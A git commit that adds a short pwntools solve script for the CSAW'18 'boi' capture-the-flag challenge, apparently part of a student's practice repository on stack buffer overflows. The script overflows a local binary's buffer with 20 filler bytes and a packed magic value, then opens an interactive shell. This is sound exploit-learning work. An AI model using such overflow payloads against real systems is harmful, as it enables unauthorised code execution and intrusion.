2bdb540d4a082a08fa8bfd33278d0371f98a02a8
Mateus Marques <mateusmarques2001@usp.br>
2025-07-14 18:17:11 -0300

    First stack buffer overflow, b'A'*20 + p32(0xcaf3baee)

---
+++ workdir/ctf/02-stack_buffer_overflow/04-bof_variable/csaw18_boi/solve.py
@@ -0,0 +1,11 @@
+from pwn import *
+
+context(arch='amd64', os='linux')
+p = process('./boi')    # binary path
+
+# p32() takes care of little endian
+payload = b'A' * 20 + p32(0xcaf3baee)   # b'A' is necessary, because pwn used bytes, not str
+
+p.send(payload)
+
+p.interactive()  # Takes over stdin/stdout for shell interaction
